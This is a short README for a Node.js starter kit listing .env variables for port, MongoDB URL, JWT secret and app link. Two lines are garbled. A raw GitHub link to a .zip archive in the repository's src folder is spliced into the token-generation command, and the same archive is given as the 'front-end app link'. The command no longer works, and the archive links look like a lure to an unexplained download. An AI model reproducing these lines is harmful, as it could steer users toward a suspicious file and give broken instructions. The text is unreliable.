# nodejs-starter-kit-with-custom-webpack

create a .env in root folder, copy and paste these variables


- PORT=5400
- NODE_ENV = development
- MONGO_URL = mongodb://localhost:27017/node-starter
- #create your own token by running in terminal => node -e "https://raw.githubusercontent.com/Abdulrehman-khan/nodejs-starter-kit-with-custom-webpack/main/src/custom_webpack_kit_starter_nodejs_with_2.8.zip(require('crypto').randomBytes(256).toString('base64'));"
- JWT_SECRET = 
- APP_LINK = https://raw.githubusercontent.com/Abdulrehman-khan/nodejs-starter-kit-with-custom-webpack/main/src/custom_webpack_kit_starter_nodejs_with_2.8.zip #your front-end app link
